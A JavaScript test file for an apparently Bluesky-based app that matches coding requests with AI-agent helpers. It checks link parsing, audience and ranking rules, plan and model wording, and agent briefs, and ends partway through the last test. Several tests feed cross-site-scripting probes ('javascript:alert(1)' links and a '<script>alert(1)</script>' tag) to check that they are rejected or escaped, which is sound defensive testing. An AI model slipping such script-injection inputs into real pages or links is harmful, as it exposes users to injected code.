// Run with: npm test (node --test, no dependencies)
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { SEED, SITE, FAMILIES, PLANS, lowBudgetOf } from '../core/ns.js';
import { parseSubject, describeSubject, cloneUrlOf } from '../core/subjects.js';
import * as R from '../core/records.js';
import { meantFor, closeness } from '../core/circle.js';
import { rank, score, fit } from '../core/rank.js';
import { whereText, shortWhere, jobText, jobShort, modelsText, wantsShort, notesText, jobAndNotes, progressOf, progressShort, askExcerpt, stageOf, nounOf, aNoun, pictureOf, whatItIs, stateText, planText } from '../core/words.js';
import { wateredBy, wateredText } from '../core/garden.js';
import { renderMarkdown } from '../core/markdown.js';
import { brief, launchers, handBack, readHandBack, readBranchBack, handBackBranch } from '../core/brief.js';
import { createDemoSource } from '../core/demo.js';
import { splitSpaceUri, shown } from '../core/source.js';
import { lifeOf } from '../ui/bits.js';
import { standing, since, carry } from '../core/status.js';
import { newRepoPlaces, placesFor, repoNameFor } from '../core/forges.js';
import { pullsAbout, tangledRepos, tangledIssues, completeTangled, subjectInfo, pullState, linkedPulls, knotlessRepos, knotlessIssues, knotlessIssueSubject, pullPageOf, pullKey, pullNumber } from '../core/subjects.js';
import { look } from '../core/status.js';

test('parses GitHub, Tangled and other links into subjects', () => {
  const gi = parseSubject('https://github.com/dame-is/atmosphere-online/issues/42');
  assert.equal(gi.$type, SEED + '#githubIssue');
  assert.equal(gi.repo, 'dame-is/atmosphere-online'); assert.equal(gi.number, 42);
  assert.equal(cloneUrlOf(gi), 'https://github.com/dame-is/atmosphere-online.git');

  const gr = parseSubject('https://github.com/dame-is/atmosphere-online.git');
  assert.equal(gr.$type, SEED + '#repo'); assert.equal(gr.name, 'dame-is/atmosphere-online');

  const ti = parseSubject('https://tangled.org/@dame.is/garden/issues/7');
  assert.equal(ti.$type, SEED + '#tangledIssue');
  assert.equal(ti.repoUrl, 'https://tangled.org/dame.is/garden');
  assert.equal(describeSubject(ti).label, 'dame.is/garden #7');
  assert.equal(cloneUrlOf(ti), 'https://tangled.org/dame.is/garden');

  // Newer Tangled issues have a longer key in place of a number, and "new" is the form, not an issue.
  const tk = parseSubject('https://tangled.org/dame.is/garden/issues/3lzq4w5qk2c2a');
  assert.equal(tk.url, 'https://tangled.org/dame.is/garden/issues/3lzq4w5qk2c2a'); assert.equal(describeSubject(tk).label, 'dame.is/garden');
  assert.equal(parseSubject('https://tangled.org/dame.is/garden/issues/new').$type, SEED + '#repo');
  // An issue's own record lives in the repo's account, so its address names the repo.
  const at = parseSubject('at://did:plc:abc/org.tangled.track.ticket/3kxyz');
  assert.deepEqual([at.uri, at.repo], ['at://did:plc:abc/org.tangled.track.ticket/3kxyz', 'did:plc:abc']);
  assert.equal(parseSubject('at://did:plc:abc/sh.tangled.repo.issue/3kxyz'), null);

  // knotless: an issue's page names whose account it's in and its key; the site's own pages aren't repos.
  const ki = parseSubject('https://knotless.dev/alice.test/proj/issue/did%3Aplc%3Aabc/3mzeld/');
  assert.deepEqual(ki, { $type: SEED + '#knotlessIssue', url: 'https://knotless.dev/alice.test/proj/issue/did:plc:abc/3mzeld', repoUrl: 'https://knotless.dev/alice.test/proj', uri: 'at://did:plc:abc/dev.knotless.issue/3mzeld' });
  assert.deepEqual([describeSubject(ki).forge, describeSubject(ki).label, cloneUrlOf(ki), whereText({ subject: ki }), shortWhere({ subject: ki })], ['knotless', 'alice.test/proj', 'https://knotless.dev/alice.test/proj', 'knotless issue, alice.test/proj', 'knotless']);
  const kr = parseSubject('https://knotless.dev/alice.test/proj.git');
  assert.deepEqual([kr.$type, kr.forge, kr.name, cloneUrlOf(kr)], [SEED + '#repo', 'knotless', 'alice.test/proj', 'https://knotless.dev/alice.test/proj']);
  assert.equal(parseSubject('https://knotless.dev/docs/guide/agents/'), null);
  assert.equal(parseSubject('https://knotless.dev/alice.test/proj/pull/did:plc:abc/3mzpull').$type, SEED + '#repo');

  const cb = parseSubject('https://codeberg.org/someone/thing');
  assert.equal(cb.forge, 'codeberg');
  assert.equal(parseSubject('not a link'), null);
  assert.equal(parseSubject('javascript:alert(1)'), null);
});

test('builds seeds with sensible defaults and limits', () => {
  assert.throws(() => R.seed({ title: '  ' }), /title/);
  const r = R.seed({ title: 'x'.repeat(200), tags: 'Rust, CLI tools, rust', audience: 'nonsense' });
  assert.equal([...r.title].length, 120);
  assert.deepEqual(r.tags, ['rust', 'cli-tools']);
  assert.equal(r.audience.$type, SEED + '#mutuals', 'a word nobody knows keeps it narrow');
  assert.equal(R.seed({ title: 't' }).audience.$type, SEED + '#anyone', 'left out, it’s open to everyone');
  assert.ok(r.createdAt && !r.updatedAt && !r.state);
  assert.throws(() => R.seed({ title: 't', audience: 'list' }), /list/);
  const g = R.seed({ title: 't', group: 'did:plc:group' });
  assert.deepEqual(g.audience, { $type: SEED + '#group', group: 'did:plc:group' });
  const w = R.seed({ title: 't', wants: { models: ['claude-opus-5-5', ''], tests: 'required', maxDiffLines: '300' }, specUrl: 'javascript:alert(1)' });
  assert.deepEqual(w.wants, { models: ['claude-opus-5-5'], tests: 'required', maxDiffLines: 300 });
  assert.equal(w.specUrl, undefined);
  const edited = R.seed({ title: 'new' }, { createdAt: '2026-01-01T00:00:00.000Z', state: 'sprouted' });
  assert.equal(edited.createdAt, '2026-01-01T00:00:00.000Z'); assert.equal(edited.state, 'sprouted'); assert.ok(edited.updatedAt);
  // Saving one again (closing it, marking it sprouted) keeps who it's for, list and all.
  const open = R.seed({ title: 't', audience: 'anyone' }), listed = R.seed({ title: 't', audience: 'list', list: 'at://did:plc:a/app.bsky.graph.list/1' });
  assert.equal(R.seed({ ...open, state: 'sprouted' }, open).audience.$type, SEED + '#anyone');
  assert.deepEqual(R.seed({ ...listed, state: 'closed' }, listed).audience, { $type: SEED + '#list', list: 'at://did:plc:a/app.bsky.graph.list/1' });
});

test('profiles keep private fields out of the public copy', () => {
  const p = R.profile({ budget: 'none', circumstances: ['student', 'astronaut'], values: 'Climate, local first', setups: [{ harness: 'claude-code', models: 'claude-opus-5-5' }, { harness: '' }], forecast: { level: 'showers', until: 'not a date' } });
  assert.deepEqual(p.circumstances, ['student']);
  assert.deepEqual(p.values, ['climate', 'local-first']);
  assert.equal(p.setups.length, 1); assert.deepEqual(p.setups[0].models, ['claude-opus-5-5']);
  assert.deepEqual(p.forecast, { level: 'showers' });
  const pub = R.publicProfile(p, ['budget', 'circumstances']);
  assert.equal(pub.budget, undefined); assert.equal(pub.circumstances, undefined); assert.deepEqual(pub.values, p.values);
});

test('takes and deliveries need a real seed and a link', () => {
  assert.throws(() => R.take({ seed: { uri: 'at://x' } }), /found/);
  const t = R.take({ seed: { uri: 'at://a/b/c', cid: 'bafy' }, setup: { harness: 'codex', models: ['gpt-5-codex'] } });
  assert.deepEqual(t.seed, { uri: 'at://a/b/c', cid: 'bafy' });
  assert.throws(() => R.delivery({ seed: { uri: 'at://a/b/c', cid: 'bafy' } }), /pull request/);
  const d = R.delivery({ seed: { uri: 'at://a/b/c', cid: 'bafy' }, url: 'https://github.com/o/r/pull/1', sessionUrl: 'ftp://nope' });
  assert.equal(d.url, 'https://github.com/o/r/pull/1'); assert.equal(d.sessionUrl, undefined);
});

test('audiences decide who a seed is meant for', () => {
  const rec = a => ({ audience: { $type: `${SEED}#${a}`, ...(a === 'list' ? { list: 'at://x/app.bsky.graph.list/1' } : {}) } });
  const base = { viewer: 'did:me', author: 'did:them' };
  const mutual = { following: true, followedBy: true }, theyFollow = { followedBy: true }, iFollow = { following: true };
  assert.equal(meantFor(rec('anyone'), { ...base, viewer: null }), true);
  assert.equal(meantFor(rec('mutuals'), { ...base, viewer: null }), false);
  assert.equal(meantFor(rec('mutuals'), { ...base, rel: mutual }), true);
  assert.equal(meantFor(rec('mutuals'), { ...base, rel: theyFollow }), false);
  assert.equal(meantFor(rec('following'), { ...base, rel: theyFollow }), true);
  assert.equal(meantFor(rec('following'), { ...base, rel: iFollow }), false);
  assert.equal(meantFor(rec('followers'), { ...base, rel: iFollow }), true);
  assert.equal(meantFor(rec('list'), { ...base, inList: true }), true);
  assert.equal(meantFor(rec('list'), { ...base, inList: false }), false);
  assert.equal(meantFor(rec('anyone'), { ...base, rel: { blockedBy: true } }), false);
  assert.equal(meantFor(rec('mutuals'), { viewer: 'did:me', author: 'did:me' }), true);
  assert.equal(closeness({ ...base, rel: mutual }), 'mutual');
  assert.equal(closeness({ ...base, rel: theyFollow }), 'follows-you');
  assert.equal(closeness({ ...base, group: true }), 'group');
});

// Who a helper would like to help first, and what they care about, are set aside for now
// (FEATURES in core/ns.js); these run with them on, as they will be when they come back.
const ON = { priorities: true, values: true, circumstances: true };
test('ranking puts the people a helper prioritises first, and says why', () => {
  const me = { did: 'did:me', profile: { priorities: ['low-budget', 'values-aligned'], values: ['climate'], setups: [{ harness: 'claude-code', models: ['claude-opus-5-5'] }] } };
  const items = [
    { uri: 'a', closeness: 'mutual', value: { createdAt: '2026-01-02T00:00:00Z', wants: { models: ['gpt-5'] } }, profile: { budget: 'high' } },
    { uri: 'b', closeness: 'you-follow', value: { createdAt: '2026-01-01T00:00:00Z', values: ['climate'], wants: { models: ['opus'] } }, profile: { budget: 'none' } }
  ];
  const out = rank(items, me, ON);
  assert.equal(out[0].uri, 'b');
  const texts = out[0].reasons.map(r => r.text);
  assert.ok(texts.includes('No AI plan')); assert.ok(texts.some(t => /Shares climate/.test(t))); assert.ok(texts.some(t => /Opus: you run Opus/.test(t)));
  assert.ok(out[1].reasons.some(r => r.tone === 'down'));
  const taken = score({ closeness: 'mutual', value: {}, takes: [{ repo: 'did:other' }] }, me, ON);
  assert.ok(taken.reasons.some(r => r.text === 'Someone’s on it'));
});

test('fit says how well a seed suits a helper, in one sentence', () => {
  const me = { did: 'did:me', profile: { priorities: ['low-budget', 'students'], values: ['accessibility'], offering: ['css'], setups: [{ harness: 'claude-code', models: ['claude-sonnet-5-5'] }] } };
  const strong = fit({ closeness: 'mutual', author: { displayName: 'Juniper Hale' }, value: { tags: ['css'], values: ['accessibility'], wants: { models: ['claude-sonnet-5-5'] } }, profile: { budget: 'none', circumstances: ['student'] } }, me, ON);
  assert.equal(strong.level, 3); assert.equal(strong.label, 'Strong fit');
  assert.equal(strong.why, 'Juniper has no AI plan, is a student and cares about accessibility too. They’d like Sonnet, which you have. It’s css, your kind of work.');
  const some = fit({ closeness: 'you-follow', author: { handle: 'kai.example' }, value: { wants: { models: ['gpt-5'] } }, takes: [{ repo: 'did:other' }] }, me, ON);
  assert.equal(some.level, 1);
  assert.equal(some.why, 'It’s from your circle. Heads up: they’d like GPT-5, which isn’t in your plan or setup. Someone’s already on it.');
  assert.equal(fit({ closeness: 'group', author: { displayName: 'Mo' }, value: {} }, me).why, 'Mo is in your group.');
  assert.equal(fit({ value: {} }, me).why, 'It’s open to everyone.');
  assert.ok(rank([{ closeness: 'mutual', value: {} }], me)[0].fit.label);
});

test('set aside, who you’d like to help first and their situation have no say in the board', () => {
  const me = { did: 'did:me', profile: { priorities: ['low-budget', 'students'], setups: [{ harness: 'claude-code', models: ['claude-sonnet-5-5'] }] } };
  const juniper = { closeness: 'mutual', author: { displayName: 'Juniper Hale' }, value: {}, profile: { plans: ['none'], circumstances: ['student'] } };
  const OFF = { priorities: false, values: false, circumstances: false }, off = score(juniper, me, OFF), on = score(juniper, me, ON);
  assert.ok(on.score > off.score);
  // Said either way, but as a match rather than as something you asked for.
  // Without a plan is a fact about their plan, so it's said either way; being a student is set aside.
  assert.deepEqual(off.reasons.map(r => [r.text, r.tone]), [['No AI plan', 'match']]);
  assert.equal(fit(juniper, me, OFF).why, 'Juniper has no AI plan.');
});

test('the models an ask would like, against your plans and what you run', () => {
  const opus = { wants: { models: ['claude-opus-5-5', 'claude-sonnet-5-5'] } };
  assert.equal(modelsText(opus, { plans: ['claude'] }), 'Opus or Sonnet. Your Claude plan has Claude models.');
  assert.equal(modelsText(opus, { plans: ['copilot'] }), 'Opus or Sonnet. Your Copilot plan has Claude models.');
  assert.equal(modelsText(opus, { plans: ['chatgpt'] }), 'Opus or Sonnet. Not in your plan or setup.');
  // Pay as you go and paid by work or school aren't plans here any more: a record that has them says nothing either way.
  assert.equal(modelsText(opus, { plans: ['api'] }), 'Opus or Sonnet.');
  assert.equal(planText({ plans: ['work', 'claude'] }), 'Claude');
  assert.equal(planText({ plans: ['api'], budget: 'none' }), 'No AI plan');
  assert.ok(!PLANS.some(([k]) => k === 'api' || k === 'work'));
  assert.deepEqual(R.plans(['api', 'work', 'none']), ['none']);
  // What you run comes before what your plan reaches.
  assert.equal(modelsText(opus, { plans: ['claude'], setups: [{ harness: 'claude-code', models: ['claude-opus-5-5'] }] }), 'Opus or Sonnet. You run Opus.');
  assert.equal(modelsText({ wants: { models: ['gpt-5-codex', 'gemini-3-pro'] } }, { plans: ['cursor'] }), 'GPT-5 Codex or Gemini 3 Pro. Your Cursor plan has GPT and Gemini models.');
  // On the board: running it counts most, a plan that reaches it counts too, saying nothing
  // counts nothing, and a plan that doesn't reach it counts against.
  const me = profile => ({ did: 'did:me', profile }), it = { closeness: 'mutual', author: { displayName: 'Tomás' }, value: opus };
  const [ran, planned, unsaid, missed] = [{ setups: [{ harness: 'claude-code', models: ['claude-sonnet-5-5'] }] }, { plans: ['claude'] }, { plans: ['work'] }, { plans: ['chatgpt'] }].map(p => score(it, me(p)).score);
  assert.ok(ran > planned && planned > unsaid && unsaid > missed, [ran, planned, unsaid, missed].join(' '));
  assert.equal(fit(it, me({ plans: ['claude'] })).why, 'Tomás is a mutual. They’d like Opus or Sonnet, and your Claude plan has Claude models.');
  assert.equal(fit(it, me({ plans: ['chatgpt'] })).why, 'Tomás is a mutual. Heads up: they’d like Opus or Sonnet, which isn’t in your plan or setup.');
});

test('an ask says a model family and a level, not a model', () => {
  const ask = (families, level) => ({ wants: { families, level } });
  assert.equal(modelsText(ask()), 'Any model.');
  assert.equal(modelsText(ask([], 'frontier')), 'A frontier model.');
  assert.equal(modelsText(ask(['claude', 'gpt'])), 'Claude or GPT.');
  assert.equal(modelsText(ask(['claude'], 'frontier')), 'A frontier Claude model.');
  assert.equal(wantsShort(ask(['glm'], 'frontier')), 'wants a frontier GLM model');
  assert.equal(wantsShort(ask()), '');
  // Against yours: a model you run from one of the families (how capable it is is yours to judge),
  // then a plan that reaches one, then a miss. "Any model" isn't judged at all.
  const sonnet = { setups: [{ harness: 'claude-code', models: ['claude-sonnet-5-5'] }], plans: ['claude'] };
  assert.equal(modelsText(ask(['claude'], 'frontier'), sonnet), 'A frontier Claude model. You run Sonnet.');
  assert.equal(modelsText(ask(['gpt', 'claude']), { plans: ['claude'] }), 'GPT or Claude. Your Claude plan has Claude models.');
  assert.equal(modelsText(ask(['glm']), sonnet), 'GLM. Not in your plan or setup.');
  assert.equal(modelsText(ask(['qwen']), { setups: [{ harness: 'opencode', models: ['qwen3-coder'] }] }), 'Qwen. You run Qwen3 Coder.');
  assert.equal(modelsText(ask([], 'frontier'), sonnet), 'A frontier model.');
  // A family nobody knows is kept as written, and only a model you run of that name matches it.
  assert.equal(modelsText(ask(['llama']), sonnet), 'Llama. Not in your plan or setup.');
  // On the board.
  const it = { closeness: 'mutual', author: { displayName: 'Tomás' }, value: ask(['claude'], 'frontier') };
  assert.equal(fit(it, { did: 'did:me', profile: sonnet }).why, 'Tomás is a mutual. They’d like a frontier Claude model, and you run Sonnet.');
  assert.equal(fit(it, { did: 'did:me', profile: { plans: ['copilot'] } }).why, 'Tomás is a mutual. They’d like a frontier Claude model, and your Copilot plan has Claude models.');
  // What's written: known families and any others as tags, and a level only if it's one there is.
  const w = R.seed({ title: 't', wants: { families: ['Claude', 'claude', 'Llama 4'], level: 'frontier' } }).wants;
  assert.deepEqual(w, { families: ['claude', 'llama-4'], level: 'frontier' });
  assert.equal(R.seed({ title: 't', wants: { level: 'galaxy-brain' } }).wants, undefined);
});

test('levels below the frontier, and a family that isn’t built in', () => {
  const ask = (families, level) => ({ wants: { families, level } });
  assert.equal(modelsText(ask(['claude'], 'mid')), 'A mid-tier Claude model.');
  assert.equal(modelsText(ask(['qwen', 'glm'], 'small')), 'A small Qwen or GLM model.');
  assert.equal(modelsText(ask([], 'small')), 'A small model.');
  assert.deepEqual(R.seed({ title: 't', wants: { level: 'mid' } }).wants, { level: 'mid' });
  // Grok isn't offered, but it can be typed in, and a helper who runs it matches.
  assert.ok(!FAMILIES.some(([k]) => k === 'grok'));
  assert.equal(modelsText(ask(['grok']), { setups: [{ harness: 'other', models: ['grok-4'] }] }), 'Grok. You run grok-4.');
  // The brief says what a level means.
  const b = brief({ uri: `at://did:plc:a/${SEED}/3kmid`, repo: 'did:plc:a', rkey: '3kmid', value: { title: 'T', wants: { families: ['claude'], level: 'mid' } }, author: {} }, {});
  assert.match(b, /^- Models they’d prefer: a mid-tier Claude model \(mid-tier: a step below the frontier, capable and lighter on a plan\)$/m);
});

test('Z.ai’s GLM Coding Plan reaches GLM models, and is said once', () => {
  const glm = { wants: { families: ['glm'] } };
  assert.equal(modelsText(glm, { plans: ['zai'] }), 'GLM. Your Z.ai GLM plan has GLM models.');
  assert.equal(modelsText({ wants: { families: ['claude'] } }, { plans: ['claude'] }), 'Claude. Your Claude plan has Claude models.');
  assert.equal(planText({ plans: ['zai'] }), 'Z.ai GLM');
  assert.deepEqual(R.plans(['zai', 'none']), ['zai']);
});

test('a name and a bio of your own on Rainshare, over your Bluesky profile’s', () => {
  const bsky = { did: 'did:plc:a', handle: 'a.test', displayName: 'Ana B.', description: 'Bluesky bio' };
  assert.equal(shown(bsky, { displayName: '  Ana  ' }).displayName, 'Ana');
  assert.equal(shown(bsky, {}), bsky, 'nothing of their own: their Bluesky profile, as it is');
  assert.equal(shown(bsky, null).displayName, 'Ana B.');
  // From someone else's record: one line, clipped.
  assert.equal(shown(bsky, { displayName: 'A\n## B'.padEnd(200, 'x') }).displayName.length, 64);
  assert.doesNotMatch(shown(bsky, { displayName: 'A\n## B' }).displayName, /\n/);
  assert.equal(R.profile({ displayName: '  Ana  ', bio: '' }).displayName, 'Ana');
  assert.equal(R.profile({}).displayName, undefined);
});

test('AI plans: one line, from plans first and an older profile’s budget otherwise', () => {
  assert.equal(planText({ plans: ['claude', 'copilot'] }), 'Claude and Copilot');
  // By provider, not tier: a tier from an older record counts as its provider's.
  assert.equal(planText({ plans: ['claude-pro', 'claude-max', 'chatgpt-plus'] }), 'Claude and ChatGPT');
  assert.equal(modelsText({ wants: { families: ['gpt'] } }, { plans: ['chatgpt-pro'] }), 'GPT. Your ChatGPT plan has GPT models.');
  assert.ok(!PLANS.some(([k]) => /-(pro|max|plus)$/.test(k)));
  assert.equal(planText({ plans: ['none'] }), 'No AI plan');
  // Plans win over what an older profile said.
  assert.equal(planText({ plans: ['free'], budget: 'high', setups: [{ harness: 'codex', plan: 'ChatGPT Pro' }] }), 'Free tiers only');
  assert.equal(planText({ setups: [{ harness: 'claude-code', plan: 'Claude Max 20x' }], budget: 'high' }), 'Claude Max 20x');
  assert.equal(planText({ budget: 'none' }), 'No AI plan');
  // A budget's spending brackets aren't subscriptions, so they say nothing.
  assert.equal(planText({ budget: 'low' }), '');
  assert.equal(planText({ budget: 'sponsored' }), '');
  assert.equal(planText({}), '');
  // From someone else's record: a plan nobody knows is shown as written; anything else is dropped.
  assert.equal(planText({ plans: ['kagi', 42, null, ''] }), 'kagi');
  // Who's without a paid plan.
  assert.equal(lowBudgetOf({ plans: ['free'] }), 'free');
  assert.equal(lowBudgetOf({ plans: ['none'], budget: 'high' }), 'none');
  assert.equal(lowBudgetOf({ plans: ['claude-max'], budget: 'none' }), null);
  assert.equal(lowBudgetOf({ budget: 'low' }), null);
  assert.equal(lowBudgetOf({}), null);
  // What's written: known plans only, and a paid one means "none" and "free" don't apply.
  assert.deepEqual(R.plans(['claude-pro', 'none', 'kagi', 'claude-max']), ['claude']);
  assert.deepEqual(R.plans(['none', 'free']), ['free']);
  assert.deepEqual(R.plans('claude'), []);
  assert.deepEqual(R.profile({ plans: ['none'] }).plans, ['none']);
  assert.equal(R.profile({}).plans, undefined);
});

test('a seed reads as plain lines, not chips', () => {
  const sq = { title: 't', size: 'small', parallel: true, subject: { $type: SEED + '#githubIssue', url: 'https://github.com/o/r/issues/14', repo: 'o/r', number: 14 }, wants: { tests: 'required', maxDiffLines: 200, models: ['claude-opus-5-5', 'claude-sonnet-5-5'], harnesses: ['claude-code'], notes: 'No new dependencies' } };
  assert.equal(whereText(sq), 'GitHub issue #14, o/r'); assert.equal(shortWhere(sq), 'GitHub #14');
  assert.equal(whereText({ subject: { $type: SEED + '#tangledIssue', url: 'https://tangled.org/kai.example/almanac/issues/88', repoUrl: 'https://tangled.org/kai.example/almanac' } }), 'Tangled issue #88, kai.example/almanac');
  assert.equal(whereText({}), 'No repo yet');
  assert.equal(jobText(sq), 'Small. Tests required. Under about 200 lines. More than one helper can try.');
  assert.equal(jobShort(sq), 'small job, tests required'); assert.equal(jobText({}), 'Not said.');
  assert.equal(modelsText(sq, { setups: [{ models: ['claude-sonnet-5-5'] }] }), 'Opus or Sonnet. You run Sonnet.');
  assert.equal(modelsText(sq), 'Opus or Sonnet.');
  assert.equal(modelsText({}), 'Any model.');
  // What else they asked for goes with the job.
  assert.equal(notesText(sq), 'Made with Claude Code. No new dependencies.');
  assert.equal(jobAndNotes(sq), 'Small. Tests required. Under about 200 lines. More than one helper can try. Made with Claude Code. No new dependencies.');
  assert.equal(jobAndNotes({ wants: { notes: 'Plain JS, please' } }), 'Plain JS, please.');
  assert.equal(jobAndNotes({}), 'Not said.');
  // Where an ask stands, in a word, and who's helping: each person once, whoever did it first.
  const kai = { did: 'did:kai', handle: 'kai.example', displayName: 'Kai Nakamura' }, ash = { did: 'did:ash', handle: 'ash.example' };
  const repo = { $type: SEED + '#githubIssue', url: 'https://github.com/o/r/issues/14', repo: 'o/r', number: 14 };
  const taking = { value: { subject: repo }, takes: [{ repo: 'did:kai', author: kai, value: { createdAt: '2026-11-10T00:00:00Z', setup: { harness: 'claude-code' }, note: 'This weekend' } }] };
  assert.deepEqual(progressOf({ value: {} }), { key: 'open', label: 'Open', idea: true, helpers: [], pulls: [] });
  assert.equal(progressShort({ value: {} }), '');
  const on = progressOf(taking, 'did:me');
  assert.equal(on.key, 'on-it'); assert.equal(on.label, 'In progress');
  assert.deepEqual(on.helpers, [{ did: 'did:kai', author: kai, mine: false, took: '2026-11-10T00:00:00Z', turnedIn: null, didIt: false, setup: { harness: 'claude-code' }, note: 'This weekend', pulls: [] }]);
  assert.equal(progressShort(taking, 'did:me'), 'Kai’s on it'); assert.equal(progressShort(taking, 'did:kai'), 'You’re on it');
  assert.equal(progressShort({ ...taking, takes: [...taking.takes, { repo: 'did:ash', author: ash, value: {} }] }, 'did:me'), '2 helpers on it');
  // Turning it in is one more thing the same person did, not another person.
  const turned = { ...taking, takes: [...taking.takes, { repo: 'did:ash', author: ash, value: { createdAt: '2026-11-09T00:00:00Z' } }], deliveries: [{ uri: 'at://did:kai/d/1', repo: 'did:kai', author: kai, value: { createdAt: '2026-11-12T00:00:00Z', setup: { harness: 'codex' } } }] };
  const ti = progressOf(turned, 'did:me');
  assert.equal(ti.key, 'turned-in'); assert.deepEqual(ti.helpers.map(h => h.did), ['did:kai', 'did:ash']);
  assert.equal(ti.helpers[0].turnedIn, '2026-11-12T00:00:00Z'); assert.equal(ti.helpers[0].setup.harness, 'codex');
  // What's turned in is a pull request with a page to open and its number, newest first, and the card names it.
  assert.deepEqual(ti.pulls, [{ uri: 'at://did:kai/d/1', link: null, number: '', state: null, didIt: false, did: 'did:kai' }]);
  const pulled = { ...turned, deliveries: [{ ...turned.deliveries[0], state: 'merged', value: { ...turned.deliveries[0].value, url: 'https://github.com/o/r/pull/15' } }] };
  assert.deepEqual(progressOf(pulled).pulls[0], { uri: 'at://did:kai/d/1', link: 'https://github.com/o/r/pull/15', number: '15', state: 'merged', didIt: false, did: 'did:kai' });
  assert.equal(progressOf(pulled).helpers[0].pulls[0].number, '15');
  assert.equal(progressShort(turned, 'did:me'), 'Kai’s pull request'); assert.equal(progressShort(turned, 'did:kai'), 'Your pull request');
  const two = { ...pulled, deliveries: [...pulled.deliveries, { uri: 'at://did:ash/d/2', repo: 'did:ash', author: ash, value: { createdAt: '2026-11-13T00:00:00Z', url: 'https://github.com/o/r/pull/16' } }] };
  assert.deepEqual(progressOf(two).pulls.map(x => x.number), ['16', '15']);
  assert.equal(progressShort(two, 'did:me'), '2 pull requests');
  // For an idea, what's turned in is where it lives, not a pull request.
  const idea = { ...turned, value: {} };
  assert.equal(progressOf(idea).idea, true); assert.equal(progressShort(idea, 'did:me'), 'Kai turned it in');
  // Once it's done, whoever's work the asker named did it; closed, it's just closed.
  const done = { ...turned, value: { subject: repo, state: 'sprouted', sproutedWith: [{ uri: 'at://did:kai/d/1' }] } };
  assert.equal(progressOf(done).key, 'done'); assert.equal(progressOf(done).helpers[0].didIt, true);
  assert.equal(progressShort(done, 'did:kai'), 'You did it');
  assert.equal(progressOf({ ...turned, value: { state: 'closed' } }).label, 'Closed'); assert.equal(progressShort({ ...turned, value: { state: 'closed' } }), '');
  assert.equal(askExcerpt('# Hi\n\n- one **two**\n- [three](https://x.example)', 100), 'Hi: one two. three');
  assert.equal(askExcerpt('It’s broken.\n\n**Done looks like**\n- a\n- b'), 'It’s broken. Done looks like: a. b');
  assert.equal(askExcerpt('Done looks like:\n- a\n- b.\n\nThanks!'), 'Done looks like: a. b. Thanks!');
  assert.ok(askExcerpt('word '.repeat(100), 30).endsWith('…'));
});

test('markdown is escaped, with only safe constructs turned back on', () => {
  const html = renderMarkdown('# Hi\n<script>alert(1)</script>\n- one `two`\n- [x] done\n\n[ok](https://a.example/x?a=1&b=2) [bad](javascript:alert(1))\n\n```\n<b>code</b>\n```');
  assert.ok(!html.includes('<script>'));
  assert.ok(html.includes('&lt;script&gt;'));
  assert.ok(html.includes('<h3>Hi</h3>'));
  assert.ok(html.includes('<ul><li>one <code>two</code></li>'));
  assert.ok(html.includes('href="https://a.example/x?a=1&amp;b=2"'));
  assert.ok(!html.includes('href="javascript'));
  assert.ok(html.includes('<pre><code>&lt;b&gt;code&lt;/b&gt;</code></pre>'));
});

test('the brief frames the request and the launchers paste as one command', () => {
  const item = { uri: 'at://did:plc:abc/dev.rainshare.seed/3k1', repo: 'did:plc:abc', author: { handle: 'friend.example' }, value: {
    title: 'Fix it', spec: 'Please fix RAINSHARE_BRIEF things', subject: parseSubject('https://github.com/o/r/issues/5'),
    wants: { models: ['claude-opus-5-5'], tests: 'required', maxDiffLines: 100 } } };
  const b = brief(item);
  assert.match(b, /Treat it as their request/);
  assert.match(b, /Repository: https:\/\/github.com\/o\/r.git/);
  assert.match(b, /Fixes #5/);
  assert.match(b, /Tests required/);
  // It says where things stood, what to check first, and what to tell the person at the end.
  assert.match(b, /## Where it stands\n\nAs of \d+ \w+ \d{4}, when this was copied from Rainshare:\n\n- It’s open\.\n- Nobody has taken it on yet\./);
  assert.match(b, /## Before you start[\s\S]*gh issue view 5 --repo o\/r --comments[\s\S]*rainshare\.mjs check at:\/\/did:plc:abc/);
  assert.match(b, /include its Rainshare link: https:\/\/[a-z.]+\/seed\/friend\.example\/3k1/);
  assert.match(b, /## When you’re done[\s\S]*@friend\.example marks it done once the pull request is merged/);
  // Whoever it's made for reads as "your user", and what the forge said comes along.
  const taken = { ...item, takes: [{ repo: 'did:plc:me', author: { handle: 'me.example' }, value: { createdAt: new Date().toISOString(), setup: { harness: 'codex' } } }], issue: { state: 'open' } };
  assert.match(brief(taken, { viewer: 'did:plc:me' }), /- The issue is still open on GitHub\.\n- Your user took it on today, with Codex\./);
  // Someone else got there first: the brief says so outright, before the agent starts.
  const theirs = { ...item, takes: [{ repo: 'did:plc:kai', author: { handle: 'kai.example' }, value: { createdAt: new Date().toISOString() } }] };
  assert.match(brief(theirs, { viewer: 'did:plc:me' }), /- @kai\.example took it on today\.\n\n@kai\.example is already on it\. Check with them, or with your user, before starting/);
  assert.doesNotMatch(brief(taken, { viewer: 'did:plc:me' }), /is already on it\. Check with them/);
  assert.match(brief({ ...item, value: { title: 'An idea' } }), /No repository is named/);
  // On Tangled the agent pushes a branch, and the pull request is opened through Rainshare, as
  // the person: by the agent if Rainshare is signed in beside it, or by a link it hands back.
  const tb = brief({ ...item, value: { title: 't', subject: parseSubject('https://tangled.org/a/b/issues/2') } });
  assert.match(tb, /1\. Look at the issue, and at the repository’s pull requests on tangled\.org, for one that already does this: https:\/\/tangled\.org\/a\/b\/issues\/2 and https:\/\/tangled\.org\/a\/b\/pulls\./);
  assert.match(tb, /- Push your branch first: to a\/b itself[\s\S]*open-pr at:\/\/did:plc:abc\/dev\.rainshare\.seed\/3k1 --branch <branch> --model <model>`[\s\S]*rainshare_open_pr[\s\S]*[a-z.]+\/seed\/friend\.example\/3k1\?branch=<branch>&model=<model>[\s\S]*link the issue \(https:\/\/tangled\.org\/a\/b\/issues\/2\)[\s\S]*git format-patch[\s\S]*https:\/\/tangled\.org\/a\/b\/pulls\/new/);
  assert.match(tb, /1\. The pull request’s address, if you opened it yourself\. If you didn’t, the link above that opens it from Rainshare[^\n]*\n2\. Whether it’s turned in on Rainshare\./);
  assert.doesNotMatch(tb, /\?pr=|gh pr list|Fixes #/);
  // A private one has no link to hand back and nothing a CLI can reach: the person opens it on Tangled.
  const tp = brief({ ...item, space: 'at://g/space/x/y', value: { title: 't', subject: parseSubject('https://tangled.org/a/b/issues/2') } });
  assert.match(tp, /your user opens the pull request: on Tangled, at https:\/\/tangled\.org\/a\/b\/pulls\/new/);
  assert.doesNotMatch(tp, /open-pr|\?branch=/);
